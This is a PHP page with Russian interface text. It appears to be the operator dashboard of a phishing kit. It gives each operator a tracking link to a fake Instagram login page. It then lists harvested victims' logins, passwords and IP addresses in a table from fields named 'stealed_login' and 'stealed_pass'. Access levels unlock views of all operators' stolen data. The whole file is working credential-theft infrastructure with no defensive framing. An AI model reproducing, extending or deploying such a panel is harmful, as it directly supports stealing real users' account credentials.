<?php

use \core\{Controller, Model, FactoryAccess};

$id = Controller::getAuth();

$stmt = Model::prepare("SELECT * FROM users LEFT JOIN accounts ON users.id = accounts.user_id WHERE users.id = ?");

$result = $stmt->execute([$id]);

if(!$result) exit('Ошибка');

$data = $stmt->fetchall(\PDO::FETCH_ASSOC);

$id = $data[0]['id'];
$_SESSION['access'] = $data[0]['access'];
$access = $_SESSION['access'];

$params = FactoryAccess::getParams($access);

?>


<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
    <a href="<?= Controller::url('logout') ?>">logout</a>
    <a href="<?= Controller::url('change') ?>">Изменить данные</a>
    <?php if($params['all']): ?>
        <a href="<?= Controller::url('all') ?>">Полученные данные всех пользователей</a>
    <?php endif; ?>
    <?php if($params['users']): ?>
        <a href="<?= Controller::url('users') ?>">Все пользователи</a>
    <?php endif; ?>

    <h1><?= $data[0]['login']?></h1>
    <h2>Уровень доступа: <?= $access ?></h2>
    <br />
    <h2>Доступные фишинги:</h2>
    <p>Вход в инстаграм - <?= Controller::getSet('instagram') . "?id=$id" ?></p>
    <br />
    <h2>Полученные данные</h2>
    <table>
        <tr>
            <td>Логин</td>
            <td>Пароль</td>
            <td>IP</td>
        </tr>
        <?php if(isset($data[0]['steal_id'])): ?>
            <?php foreach($data as $d): ?>
                <tr>
                    <td><?= $d['stealed_login'] ?></td>
                    <td><?= $d['stealed_pass'] ?></td>
                    <td><?= $d['ip'] ?></td>
                    <td>
                        <a href="<?= Controller::url('delete') . "?id=" . $d['steal_id'] ?>">Удалить</a>
                    </td>
            <?php endforeach; ?>
        <?php endif; ?>
        </tr>
    </table>
</body>
</html>
